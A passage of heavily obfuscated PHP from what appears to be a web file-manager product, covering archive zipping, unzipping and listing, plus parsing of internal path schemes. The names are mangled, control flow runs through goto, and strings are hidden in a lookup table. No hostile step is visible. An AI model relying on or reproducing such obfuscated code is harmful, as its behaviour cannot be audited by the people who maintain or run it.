{ continue; } $BÅ†·æÙ = $aµŠÛŞ¸£Ø[$FÕ©¢ÎÛ«™[$D›•›–ÜöÍ[159]]]; foreach ($BÅ†·æÙ as &$d›ó¦ø¯Ÿø) { $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[423]] = $FÕ©¢ÎÛ«™[$D›•›–ÜöÍ[423]]; $d›ó¦ø¯Ÿø[$D›•›–ÜöÍ[545]] = !0; } unset($d›ó¦ø¯Ÿø); } goto C†ñõôË¾§; C†ñõôË¾§: $BµÀÕÈÙ¢É = array(); foreach ($A´°ùÌ¿ š as $CÏÒ°Ä¡¬†) { if (isset($CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[545]]) && $CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[545]]) { continue; } $fÂô£Å¤—¿ = $fÍ”‡â¾->getPathInner($CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[75]]); $C‰®®Üƒ¼ = $B´Ô‰·¤è³->addFileMake($fÂô£Å¤—¿, $CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[77]], $CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[160]], $CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[159]], $CÏÒ°Ä¡¬†[$D›•›–ÜöÍ[28]], $dçãœç–); $BµÀÕÈÙ¢É[] = $C‰®®Üƒ¼; } $B´Ô‰·¤è³->addAll($BµÀÕÈÙ¢É); goto bºœ‰˜†˜ê; bºœ‰˜†˜ê: $A±Ğí‰ø›Õ = array($D›•›–ÜöÍ[159] => array($D›•›–ÜöÍ[7], array_keys($aµŠÛŞ¸£Ø))); $DÔ¬™™äê = $B´Ô‰·¤è³->where($A±Ğí‰ø›Õ)->select(); $DÔ¬™™äê = $DÔ¬™™äê ? $DÔ¬™™äê : array(); goto bÀÖèãİ‚¨; Fğ•ªÌ©Ùâ: } } goto c £àñ‚§Ì; B‚‰İåóŒ: define($_SERVER[ºÖÙÂŒäÉê‡][1894], 1); define($_SERVER[ºÖÙÂŒäÉê‡][1895], 2); define($_SERVER[ºÖÙÂŒäÉê‡][1896], 3); goto B£†Ñàè¤³; A‡‡¥èĞ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $CÛœ¾™¿†œ; if (!$CÛœ¾™¿†œ) { $D‹×ŞÊôÃ = IO::init($_SERVER[ºÖÙÂŒäÉê‡][8]); } return $D‹×ŞÊôÃ; } private static function iconvSystem($CĞ•ôå‰Ò) { return self::local()->iconvSystem($CĞ•ôå‰Ò); } private static function iconvApp($BÑô„çõÁõ) { return self::local()->iconvApp($BÑô„çõÁõ); } public static function zip($cëŸ¶ÑÕ‹‡, $dŞ ‰Ü¾ê = "\x7a\151\x70", $dÂ§ø…® = '', $açÏÂö°©Œ = REPEAT_RENAME) { goto Eé‹İø´…; A¢·”ï¿¯Ø: foreach ($aÉùø¶»©Ğ as $A›Ôš·” => $Fù÷‚ÇœÉ) { $aÉùø¶»©Ğ[$A›Ôš·”] = self::iconvSystem($Fù÷‚ÇœÉ); } KodArchive::create($FİÒÀ®æàÖ, $aÉùø¶»©Ğ); if (!IO::exist($FŸåî˜ò‚…)) { if ($c²àğ¥Ã‘Ï) { del_dir($c²àğ¥Ã‘Ï); } show_json(LNG($fÙàìŒ¡åÆ[1017]), !1); } goto d­ô¥’Ÿ¸Î; e¶¨’¹¬’: if (count($aÉùø¶»©Ğ) > 1) { $BãĞÉÆ¥š = IO::info(IO::pathFather($A»ñ±Ù£ôÆ[$fÙàìŒ¡åÆ[75]])); $aË´ÎÒº¸ = $BãĞÉÆ¥š[$fÙàìŒ¡åÆ[28]]; } $aµÓø‚²š = $c²àğ¥Ã‘Ï; if (!$aµÓø‚²š) { $aµÓø‚²š = get_path_father($A»ñ±Ù£ôÆ[$fÙàìŒ¡åÆ[75]]); $bø§³ÑŸôã = IO::info($aµÓø‚²š); if (!$bø§³ÑŸôã[$fÙàìŒ¡åÆ[195]]) { show_json(LNG($fÙàìŒ¡åÆ[1016]), !1); } } goto aÅ†Ù÷…¼¹; d­ô¥’Ÿ¸Î: if ($dÂ§ø…® || !$c²àğ¥Ã‘Ï) { if ($c²àğ¥Ã‘Ï && strstr($c²àğ¥Ã‘Ï, TEMP_FILES)) { $fƒ‚Û‡…Ûœ = $aÉùø¶»©Ğ = array(); recursion_dir($aµÓø‚²š, $fƒ‚Û‡…Ûœ, $aÉùø¶»©Ğ, 0); foreach ($fƒ‚Û‡…Ûœ as $EšÔ´ß»„) { del_dir($EšÔ´ß»„); } foreach ($aÉùø¶»©Ğ as $bèËÙ‹×¡½) { if ($bèËÙ‹×¡½ == $FİÒÀ®æàÖ) { continue; } del_file($bèËÙ‹×¡½); } } return $FŸåî˜ò‚…; } $d¿§Àù‡ = self::pathFather($A»ñ±Ù£ôÆ[$fÙàìŒ¡åÆ[75]]); $EÕÄÙÃ„ƒ¡ = self::move($FŸåî˜ò‚…, $d¿§Àù‡, $açÏÂö°©Œ); goto AÓ½ÒĞ‹; b–‰¯ßÑ£: $c²àğ¥Ã‘Ï = !1; if (!$dÂ§ø…® && $d£Ò—Ÿ…ß->getType() == $fÙàìŒ¡åÆ[101]) { $aÉùø¶»©Ğ = self::zipFileList($cëŸ¶ÑÕ‹‡); } else { $c²àğ¥Ã‘Ï = $dÂ§ø…® ? $dÂ§ø…® : TEMP_FILES . $fÙàìŒ¡åÆ[1015] . time() . rand_string(8) . $fÙàìŒ¡åÆ[8]; mk_dir($c²àğ¥Ã‘Ï); $aÉùø¶»©Ğ = self::zipFileList($cëŸ¶ÑÕ‹‡, $c²àğ¥Ã‘Ï); } $aË´ÎÒº¸ = $A»ñ±Ù£ôÆ[$fÙàìŒ¡åÆ[28]]; goto e¶¨’¹¬’; AÓ½ÒĞ‹: if (!$EÕÄÙÃ„ƒ¡) { del_dir($c²àğ¥Ã‘Ï); show_json(LNG($fÙàìŒ¡åÆ[1017]), !1); } del_dir($c²àğ¥Ã‘Ï); return $EÕÄÙÃ„ƒ¡; goto BŒ¼ñ¥Ë‰È; Eé‹İø´…: $fÙàìŒ¡åÆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d£Ò—Ÿ…ß = self::init($cëŸ¶ÑÕ‹‡[0][$fÙàìŒ¡åÆ[75]]); $A»ñ±Ù£ôÆ = self::info($cëŸ¶ÑÕ‹‡[0][$fÙàìŒ¡åÆ[75]]); goto b–‰¯ßÑ£; aÅ†Ù÷…¼¹: $FŸåî˜ò‚… = $aµÓø‚²š . $aË´ÎÒº¸ . $fÙàìŒ¡åÆ[91] . $dŞ ‰Ü¾ê; $FŸåî˜ò‚… = get_filename_auto($FŸåî˜ò‚…, $fÙàìŒ¡åÆ[33], $açÏÂö°©Œ); $FİÒÀ®æàÖ = self::iconvSystem($FŸåî˜ò‚…); goto A¢·”ï¿¯Ø; BŒ¼ñ¥Ë‰È: } public static function unzip($bèœ®ŒËÀ, $e¥ğ‚øïÇ· = "\x72\x65\x70\154\x61\143\x65") { goto B´ëù™èŞæ; d„®±–: $dÇ‹Ò‡Ãó = KodArchive::extract($C¼ô›«±ÙÄ, $aÀ¼²£°¼ . $fÒÀõÆíÒ[8], $dˆÏ‡Í‡ğ½); self::archiveExt(); if (!$dÇ‹Ò‡Ãó[$fÒÀõÆíÒ[1022]]) { show_json($fÒÀõÆíÒ[1023] . $dÇ‹Ò‡Ãó[$fÒÀõÆíÒ[1024]], !1); } goto Eá‹×¶Ç; Eá‹×¶Ç: Hook::trigger($fÒÀõÆíÒ[1025], $aÀ¼²£°¼); recursion_dir($aÀ¼²£°¼, $C×Á±‡óö©, $Fçç‹”ŸÅˆ, 0); $EŠİÉ‹ñ„ = array_merge($C×Á±‡óö©, $Fçç‹”ŸÅˆ); goto cö¤Öà»íç; bÓîİÈâå: if (!@file_exists(self::iconvSystem($C¼ô›«±ÙÄ))) { $bÀ‚™‡İ… = self::localFilePath($B¼õâ½‰Ÿ˜, $CĞ‘ØÎÙÙ); $C¼ô›«±ÙÄ = $bÀ‚™‡İ… ? $bÀ‚™‡İ… : parent::download($B¼õâ½‰Ÿ˜, $C¼ô›«±ÙÄ); } $C¼ô›«±ÙÄ = self::iconvSystem($C¼ô›«±ÙÄ); $dˆÏ‡Í‡ğ½ = isset($bèœ®ŒËÀ[$fÒÀõÆíÒ[1020]]) ? $bèœ®ŒËÀ[$fÒÀõÆíÒ[1020]] : $fÒÀõÆíÒ[1021]; goto d„®±–; B´ëù™èŞæ: $fÒÀõÆíÒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B¼õâ½‰Ÿ˜ = $bèœ®ŒËÀ[$fÒÀõÆíÒ[75]]; $b„ˆÀ‚ùÅØ = $bèœ®ŒËÀ[$fÒÀõÆíÒ[1018]]; goto d§Æ„±Œ; F¦Æë‡á: $eÄ³ó‘İÆ× = self::tmpFileName($c÷Ê¸™©Ğƒ); $aÀ¼²£°¼ = TEMP_FILES . $eÄ³ó‘İÆ×; del_dir($aÀ¼²£°¼); goto DÏİÓ’ø·ğ; cö¤Öà»íç: foreach ($EŠİÉ‹ñ„ as $eÍ¼ªÀ‚® ) { $eÍ¼ªÀ‚®  = self::iconvApp($eÍ¼ªÀ‚® ); self::move($eÍ¼ªÀ‚® , $b„ˆÀ‚ùÅØ, $e¥ğ‚øïÇ·); } del_dir($aÀ¼²£°¼); if (!$bÀ‚™‡İ…) { del_file($C¼ô›«±ÙÄ); } goto C¦Ùíœ–; C¦Ùíœ–: return !0; goto Eæ¹ÖõÈ’Á; d§Æ„±Œ: if (!($c÷Ê¸™©Ğƒ = parent::info($B¼õâ½‰Ÿ˜))) { show_json(LNG($fÒÀõÆíÒ[1019]), !1); } if (!($f”¥šÅ¤Ï¼ = parent::infoFull($b„ˆÀ‚ùÅØ))) { $b„ˆÀ‚ùÅØ = parent::mkdir($b„ˆÀ‚ùÅØ); $f”¥šÅ¤Ï¼ = array($fÒÀõÆíÒ[75] => $b„ˆÀ‚ùÅØ); } else { if (isset($f”¥šÅ¤Ï¼[$fÒÀõÆíÒ[374]]) && trim($f”¥šÅ¤Ï¼[$fÒÀõÆíÒ[75]], $fÒÀõÆíÒ[8]) != trim($b„ˆÀ‚ùÅØ, $fÒÀõÆíÒ[8])) { $AÙ¹å«™—¦ = KodIO::make($f”¥šÅ¤Ï¼[$fÒÀõÆíÒ[465]]); $e”›ì°ïò = parent::fileNameAuto($AÙ¹å«™—¦, $f”¥šÅ¤Ï¼[$fÒÀõÆíÒ[28]], REPEAT_RENAME_FOLDER, !0); $b„ˆÀ‚ùÅØ = parent::mkdir($AÙ¹å«™—¦ . $e”›ì°ïò); $f”¥šÅ¤Ï¼ = array($fÒÀõÆíÒ[75] => $b„ˆÀ‚ùÅØ); } } $b„ˆÀ‚ùÅØ = $f”¥šÅ¤Ï¼[$fÒÀõÆíÒ[75]]; goto F¦Æë‡á; DÏİÓ’ø·ğ: mk_dir($aÀ¼²£°¼); $CĞ‘ØÎÙÙ = self::fileExt($c÷Ê¸™©Ğƒ); $C¼ô›«±ÙÄ = $aÀ¼²£°¼ . $fÒÀõÆíÒ[91] . $CĞ‘ØÎÙÙ; goto bÓîİÈâå; Eæ¹ÖõÈ’Á: } public static function unzipList($bëó‰±‡¨) { goto CêâÁòËÒ; eÒ´›„÷±”: return $C„ „æĞ[$AÛéîƒîÆº[1024]]; goto DØ«¬Òïç; bİä‰Ë¥è÷: $C¡Å†÷Á = 50000; if (request_url_safe($E÷†ß İ)) { $F“Â®œ›õ³ = parse_url_query($E÷†ß İ); if (!isset($F“Â®œ›õ³[$AÛéîƒîÆº[75]])) { show_json($AÛéîƒîÆº[1027], !1); } } $AÈ³«âôˆÒ = isset($F“Â®œ›õ³) ? $F“Â®œ›õ³[$AÛéîƒîÆº[75]] : $E÷†ß İ; goto BÆÒŠ­Å•Ò; bÇˆîÇó‚: if (!is_dir($D‰ê‘½ÉÛº)) { mk_dir($D‰ê‘½ÉÛº); } $F…¾ª¹ƒ = $D‰ê‘½ÉÛº . $AÛéîƒîÆº[8] . $b¹…¥¸ªÀ; if (!@file_exists(self::iconvSystem($F…¾ª¹ƒ))) { if (isset($F“Â®œ›õ³)) { url_request($E÷†ß İ, $AÛéîƒîÆº[1029], $F…¾ª¹ƒ); } else { $AÓè—ÓêŞ = self::localFilePath($E÷†ß İ, $AŞ•¤ŸïÊ®); $F…¾ª¹ƒ = $AÓè—ÓêŞ ? $AÓè—ÓêŞ : self::download($E÷†ß İ, $F…¾ª¹ƒ); } } goto DÚÇÕ”òÃğ; AÔÊÓïöŒ: self::archiveExt(); del_dir($D‰ê‘½ÉÛº); if (!$C„ „æĞ[$AÛéîƒîÆº[1022]]) { show_json($C„ „æĞ[$AÛéîƒîÆº[1024]], !1); } goto EÀ‹§¢âá; DÚÇÕ”òÃğ: $F…¾ª¹ƒ = self::iconvSystem($F…¾ª¹ƒ); if ($C²ŠßË­¤Í >= 0) { $f§½âÕñÀÀ = isset($bëó‰±‡¨[$AÛéîƒîÆº[1030]]) ? $bëó‰±‡¨[$AÛéîƒîÆº[1030]] : !1; $F²Ó© æ‚İ = isset($bëó‰±‡¨[$AÛéîƒîÆº[28]]) ? $bëó‰±‡¨[$AÛéîƒîÆº[28]] : $AÛéîƒîÆº[33]; KodArchive::filePreview($F…¾ª¹ƒ, $C²ŠßË­¤Í, $f§½âÕñÀÀ, $F²Ó© æ‚İ); self::archiveExt(); die; } $C„ „æĞ = KodArchive::listContent($F…¾ª¹ƒ); goto AÔÊÓïöŒ; CêâÁòËÒ: $AÛéîƒîÆº =& $_SERVER[ºÖÙÂŒäÉê‡]; $E÷†ß İ = $bëó‰±‡¨[$AÛéîƒîÆº[75]]; $C²ŠßË­¤Í = isset($bëó‰±‡¨[$AÛéîƒîÆº[1026]]) ? $bëó‰±‡¨[$AÛéîƒîÆº[1026]] : -1; goto bİä‰Ë¥è÷; BÆÒŠ­Å•Ò: $F„à„‚ªÀ± = self::info($AÈ³«âôˆÒ); $AŞ•¤ŸïÊ® = self::fileExt($F„à„‚ªÀ±); $a¤„íùÃğÅ = self::tmpFileName($F„à„‚ªÀ±); goto FÌ¾¶¸¿áÒ; FÌ¾¶¸¿áÒ: if (isset($F“Â®œ›õ³)) { $b°ÂŠİˆ±á = array($F“Â®œ›õ³[$AÛéîƒîÆº[75]], $F“Â®œ›õ³[$AÛéîƒîÆº[1026]], $F“Â®œ›õ³[$AÛéîƒîÆº[28]]); $b¹…¥¸ªÀ = md5(implode($AÛéîƒîÆº[70], $b°ÂŠİˆ±á)) . $AÛéîƒîÆº[91] . get_path_ext($F“Â®œ›õ³[$AÛéîƒîÆº[28]]); } else { $b°ÂŠİˆ±á = array($F„à„‚ªÀ±[$AÛéîƒîÆº[28]], $F„à„‚ªÀ±[$AÛéîƒîÆº[75]], $F„à„‚ªÀ±[$AÛéîƒîÆº[77]]); $b¹…¥¸ªÀ = md5(implode($AÛéîƒîÆº[70], $b°ÂŠİˆ±á)) . $AÛéîƒîÆº[91] . $AŞ•¤ŸïÊ®; } if ($C²ŠßË­¤Í == -1) { $b©­ŠŒ‘Â = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\x65\167\x2f{$a¤„íùÃğÅ}\x2f{$b¹…¥¸ªÀ}\x2e\154\x6f\147"; $B·ÍÂ’Äç‹ = self::infoFull($b©­ŠŒ‘Â); if ($B·ÍÂ’Äç‹) { $b©­ŠŒ‘Â = $B·ÍÂ’Äç‹[$AÛéîƒîÆº[75]]; $a×‘ö­ö Æ = self::getContent($b©­ŠŒ‘Â); if ($a×‘ö­ö Æ) { $fè¸¼‹Ø = json_decode($a×‘ö­ö Æ, !0); if (count($fè¸¼‹Ø) >= $C¡Å†÷Á) { show_json(sprintf(LNG($AÛéîƒîÆº[1028]), count($fè¸¼‹Ø)), !1); } return $fè¸¼‹Ø; } } else { $b©­ŠŒ‘Â = self::mkfile($b©­ŠŒ‘Â); } } $D‰ê‘½ÉÛº = TEMP_FILES . $a¤„íùÃğÅ; goto bÇˆîÇó‚; EÀ‹§¢âá: $fè¸¼‹Ø = json_encode($C„ „æĞ[$AÛéîƒîÆº[1024]]); self::setContent($b©­ŠŒ‘Â, $fè¸¼‹Ø); if (count($C„ „æĞ[$AÛéîƒîÆº[1024]]) >= $C¡Å†÷Á) { show_json(sprintf(LNG($AÛéîƒîÆº[1028]), count($C„ „æĞ[$AÛéîƒîÆº[1024]])), !1); } goto eÒ´›„÷±”; DØ«¬Òïç: } private static function fileExt($a—é…—š) { $FÄèŸù =& $_SERVER[ºÖÙÂŒäÉê‡]; $b¾÷™Èå½¦ = $a—é…—š[$FÄèŸù[156]]; if ($b¾÷™Èå½¦ == $FÄèŸù[1031]) { $FÃ Ôîß„ö = $FÄèŸù[1032]; if (substr($a—é…—š[$FÄèŸù[28]], -strlen($FÃ Ôîß„ö)) == $FÃ Ôîß„ö) { $b¾÷™Èå½¦ = $FÄèŸù[1033]; } } self::archiveExt($b¾÷™Èå½¦); return $b¾÷™Èå½¦; } private static function zipFileList($e£ Á¨‚ß, $DÎ‰¬“æ¤ = false) { $BŞÍÙ×­–ğ =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÕï™‚ŒìÒ = array(); foreach ($e£ Á¨‚ß as $c‰†¡ÒÒµ) { $dæõÜ‘·œ = $c‰†¡ÒÒµ[$BŞÍÙ×­–ğ[75]]; if ($DÎ‰¬“æ¤) { $dæõÜ‘·œ = self::copy($c‰†¡ÒÒµ[$BŞÍÙ×­–ğ[75]], $DÎ‰¬“æ¤, $BŞÍÙ×­–ğ[743]); } if ($dæõÜ‘·œ && self::local()->exist($dæõÜ‘·œ)) { $BÕï™‚ŒìÒ[$c‰†¡ÒÒµ[$BŞÍÙ×­–ğ[75]]] = $dæõÜ‘·œ; } } if (!empty($BÕï™‚ŒìÒ)) { return array_values($BÕï™‚ŒìÒ); } show_json(LNG($BŞÍÙ×­–ğ[1034]), !1); } public static function tmpFileName($a˜‘×Œ¬§) { $Bà² œ† =& $_SERVER[ºÖÙÂŒäÉê‡]; $C±à¦Í¶…¼ = array($a˜‘×Œ¬§[$Bà² œ†[28]], $a˜‘×Œ¬§[$Bà² œ†[75]], $a˜‘×Œ¬§[$Bà² œ†[77]], $a˜‘×Œ¬§[$Bà² œ†[463]]); return md5(implode($Bà² œ†[70], $C±à¦Í¶…¼)); } private static function localFilePath($aÕ©´ï¼à, $Bç¿ãˆĞ½Ò) { goto EñÈ¥‹çãğ; fÄÕ¡ŞàÉå: if ($aø²Äæ†Ã[$f§ºÒ«©õÒ[29]] == KodIO::KOD_SOURCE) { $bïæ•ˆî¶İ = Model($f§ºÒ«©õÒ[751])->fileInfoGet(KodIO::sourceID($aÕ©´ï¼à)); if (!$bïæ•ˆî¶İ[$f§ºÒ«©õÒ[75]]) { show_json($f§ºÒ«©õÒ[1037], !1); } $aÕ©´ï¼à = $bïæ•ˆî¶İ[$f§ºÒ«©õÒ[75]]; } $a›æÛó“ù® = self::init($aÕ©´ï¼à); $aöğˆƒ‚¦„ = $a›æÛó“ù®->getType(); goto A¼¾£ÂöÑâ; EñÈ¥‹çãğ: $f§ºÒ«©õÒ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($Bç¿ãˆĞ½Ò == $f§ºÒ«©õÒ[1035] && strtoupper(substr(PHP_OS, 0, 3)) == $f§ºÒ«©õÒ[1036]) { return !1; } $aø²Äæ†Ã = KodIO::parse($aÕ©´ï¼à); goto fÄÕ¡ŞàÉå; A¼¾£ÂöÑâ: if ($aöğˆƒ‚¦„ == $f§ºÒ«©õÒ[101] || $aöğˆƒ‚¦„ == $f§ºÒ«©õÒ[1038]) { if (!$a›æÛó“ù®->exist($a›æÛó“ù®->path)) { show_json(LNG($f§ºÒ«©õÒ[100]), !1); } return $a›æÛó“ù®->path; } return !1; goto F¯ÊŠù¦ª…; F¯ÊŠù¦ª…: } private static function archiveExt($dÏ¤¦Î‰Ä = '') { $GLOBALS[$_SERVER[ºÖÙÂŒäÉê‡][1039]] = $dÏ¤¦Î‰Ä; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\x73\145\x72\x52\145\143\171\x63\x6c\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\x72\x46\151\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\162\106\151\x6c\x65\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\x70\x52\x6f\157\164\123\145\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\x72\123\150\x61\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\x75\163\x65\162\x53\x68\x61\162\x65\114\151\156\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\x68\x61\162\x65\x49\x74\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\145\x49\164\145\x6d\x4c\x69\156\x6b\x7d"; const KOD_SEARCH = "\x7b\163\145\x61\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\142\154\157\143\x6b\175"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\x73\x65\x72\x52\145\156\143\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\x64\162\151\166\x65\x72\175"; public static function typeList() { $BÑñ„·¯»¢ =& $_SERVER[ºÖÙÂŒäÉê‡]; return array($BÑñ„·¯»¢[1040] => self::KOD_SOURCE, $BÑñ„·¯»¢[1041] => self::KOD_USER_RECYCLE, $BÑñ„·¯»¢[1042] => self::KOD_USER_FAV, $BÑñ„·¯»¢[1043] => self::KOD_USER_FILE_TAG, $BÑñ„·¯»¢[1044] => self::KOD_USER_FILE_TYPE, $BÑñ„·¯»¢[1045] => self::KOD_GROUP_ROOT_SELF, $BÑñ„·¯»¢[1046] => self::KOD_USER_SHARE, $BÑñ„·¯»¢[1047] => self::KOD_USER_SHARE_LINK, $BÑñ„·¯»¢[1048] => self::KOD_USER_SHARE_TO_ME, $BÑñ„·¯»¢[1049] => self::KOD_SHARE_ITEM, $BÑñ„·¯»¢[1050] => self::KOD_SHARE_LINK, $BÑñ„·¯»¢[1051] => self::KOD_SEARCH, $BÑñ„·¯»¢[1052] => self::KOD_BLOCK, $BÑñ„·¯»¢[1053] => self::KOD_IO, $BÑñ„·¯»¢[1054] => self::KOD_USER_RECENT, $BÑñ„·¯»¢[1055] => self::KOD_USER_DRIVER); } public static function parse($BÕÒ—·ŠğĞ) { goto f£À…Ù±Å´; e•È—ìóç: preg_match($AùëÓœ¡¡É[1056], $BÕÒ—·ŠğĞ, $eÉ——‹¯ƒº); $f¢ÆÜô£å = array($AùëÓœ¡¡É[393] => !1, $AùëÓœ¡¡É[1057] => !1, $AùëÓœ¡¡É[390] => !1, $AùëÓœ¡¡É[75] => $BÕÒ—·ŠğĞ, $AùëÓœ¡¡É[1002] => !1, $AùëÓœ¡¡É[1001] => $AùëÓœ¡¡É[33]); if (is_array($eÉ——‹¯ƒº) && count($eÉ——‹¯ƒº) == 5) { $Bèˆ•­«Ç’ = $AùëÓœ¡¡É[1058] . $eÉ——‹¯ƒº[2] . $AùëÓœ¡¡É[320]; if (in_array($Bèˆ•­«Ç’, $DÈÉËå§£®)) { $f¢ÆÜô£å[$AùëÓœ¡¡É[1002]] = $eÉ——‹¯ƒº[1]; $f¢ÆÜô£å[$AùëÓœ¡¡É[29]] = $Bèˆ•­«Ç’; $f¢ÆÜô£å[$AùëÓœ¡¡É[1059]] = substr($Bèˆ•­«Ç’, 1, -1); $f¢ÆÜô£å[$AùëÓœ¡¡É[372]] = $eÉ——‹¯ƒº[3]; } $f¢ÆÜô£å[$AùëÓœ¡¡É[1001]] = $eÉ——‹¯ƒº[4]; } goto cè ç˜Õ©å; f£À…Ù±Å´: $AùëÓœ¡¡É =& $_SERVER[ºÖÙÂŒäÉê‡]; $BÕÒ—·ŠğĞ = self::clear($BÕÒ—·ŠğĞ); $DÈÉËå§£® = array_values(self::typeList()); goto e•È—ìóç; cè ç˜Õ©å: $B¨±„Ì‚Â® = array($AùëÓœ¡¡É[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $f¢ÆÜô£å[$AùëÓœ¡¡É[1060]] = in_array($f¢ÆÜô£å[$AùëÓœ¡¡É[29]], $B¨±„Ì‚Â®); return $f¢ÆÜô£å; goto fÊ½øğÍÆ; fÊ½øğÍÆ: } public static function clear($F›ª£¾óâá) { goto B’öë¼éÉ; F†«á„µ‡„: if (substr($F›ª£¾óâá, 0, 3) == $fğ÷‹ÏŒØ[1062]) { $F›ª£¾óâá = substr($F›ª£¾óâá, 3); } while (strstr($F›ª£¾óâá, $bß ‰ğĞèá)) { $F›ª£¾óâá = str_replace($bß ‰ğĞèá, $fğ÷‹ÏŒØ[8], $F›ª£¾óâá); } $F›ª£¾óâá = preg_replace($fğ÷‹ÏŒØ[1063], $fğ÷‹ÏŒØ[8], $F›ª£¾óâá); goto b¾Ï¾–¬¿«; b¾Ï¾–¬¿«: if ($F›ª£¾óâá == $fğ÷‹ÏŒØ[8]) { return $fğ÷‹ÏŒØ[8]; } $F›ª£¾óâá = rtrim($F›ª£¾óâá, $fğ÷‹ÏŒØ[8]); return $F›ª£¾óâá; goto dŠÕ™ÊÛä; B’öë¼éÉ: $fğ÷‹ÏŒØ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F›ª£¾óâá = str_replace($fğ÷‹ÏŒØ[93], $fğ÷‹ÏŒØ[8], $F›ª£¾óâá); $bß ‰ğĞèá = $fğ÷‹ÏŒØ[1061]; goto F†«á„µ‡„; dŠÕ™ÊÛä: } public static function sourceID($b¥„‹äƒ÷) { $BÏ“‘ÙÕÄ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÚ–í²½„ = self::parse($b¥„‹äƒ÷); if ($aÚ–í²½„[$BÏ“‘ÙÕÄ[29]] !== self::KOD_SOURCE) { show_json(LNG($BÏ“‘ÙÕÄ[1064]), !1); } return $aÚ–í²½„[$BÏ“‘ÙÕÄ[372]]; } public static function make($aª¿Ïïîª) { if (!$aª¿Ïïîª) { return !1; } return self::makePath(self::KOD_SOURCE, intval($aª¿Ïïîª)); } public static function makeShare($F¢šøšÜß, $AöÅ¼œ®ó¥) { return self::makePath(self::KOD_SHARE_ITEM, $F¢šøšÜß, $AöÅ¼œ®ó¥); } public static function makeFileTypePath($b–œ®Ú¤£…) { return self::makePath(self::KOD_USER_FILE_TYPE, $b–œ®Ú¤£…); } public static function makeFileTagPath($DÈÍä´ßô) { return self::makePath(self::KOD_USER_FILE_TAG, $DÈÍä´ßô); } public static function makePath($A¥ï²¿ØÅã, $C´Ï¯«†‡Š = '', $D•è§Şª˜À = '') { $a£´‚ÌƒŠ£ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F„Ö´¸¸µå = substr($A¥ï²¿ØÅã, 1, -1); $eÏŞŒäóª¬ = $a£´‚ÌƒŠ£[1065] . $F„Ö´¸¸µå . $a£´‚ÌƒŠ£[1066] . $C´Ï¯«†‡Š . $a£´‚ÌƒŠ£[1067]; $eÏŞŒäóª¬ = $D•è§Şª˜À ? $eÏŞŒäóª¬ . $D•è§Şª˜À . $a£´‚ÌƒŠ£[8] : $eÏŞŒäóª¬; return $eÏŞŒäóª¬; } public static function hashPath($Eİ½İÙ¨Á) { $c—‚¡ÂŞŸ— =& $_SERVER[ºÖÙÂŒäÉê‡]; $CâåÓÅ“†µ = is_array($Eİ½İÙ¨Á) ? $Eİ½İÙ¨Á : IO::info($Eİ½İÙ¨Á); $f¯²âƒ•¬ = _get($CâåÓÅ“†µ, $c—‚¡ÂŞŸ—[1068], $c—‚¡ÂŞŸ—[33]); if (!$f¯²âƒ•¬) { $c¼ˆñ‹”Ğ = KodIO::parse($CâåÓÅ“†µ[$c—‚¡ÂŞŸ—[75]]); if (!$c¼ˆñ‹”Ğ[$c—‚¡ÂŞŸ—[29]]) { $f¯²âƒ•¬ = IO::hashSimple($CâåÓÅ“†µ[$c—‚¡ÂŞŸ—[75]]); } } if (!$f¯²âƒ•¬) { $f¯²âƒ•¬ = md5($CâåÓÅ“†µ[$c—‚¡ÂŞŸ—[75]] . $CâåÓÅ“†µ[$c—‚¡ÂŞŸ—[77]] . $CâåÓÅ“†µ[$c—‚¡ÂŞŸ—[106]]); } return $f¯²âƒ•¬; } public static function initSystemPath() { $cÉŸ˜œÁØ¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (defined($cÉŸ˜œÁØ¾[1069])) { return; } define($cÉŸ˜œÁØ¾[1069], self::systemPath($cÉŸ˜œÁØ¾[1070])); define($cÉŸ˜œÁØ¾[1071], self::systemPath($cÉŸ˜œÁØ¾[1072])); define($cÉŸ˜œÁØ¾[1073], self::systemPath($cÉŸ˜œÁØ¾[1074])); define($cÉŸ˜œÁØ¾[1075], self::systemPath($cÉŸ˜œÁØ¾[1076])); } private static function systemPath($föòĞªÁ×) { goto d¾‘»»ñáì; d¾‘»»ñáì: $b©ÅŠˆ¼ÀÍ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¡ºï»Ÿ«ç = $b©ÅŠˆ¼ÀÍ[1077] . ucfirst($föòĞªÁ×); $c¾†³š†×Ó = Model($b©ÅŠˆ¼ÀÍ[1078])->get($f¡ºï»Ÿ«ç); goto D×íÄåäİ; Eø±“¬å›Ó: return $c¾†³š†×Ó; goto EÆœ´Û¾»; 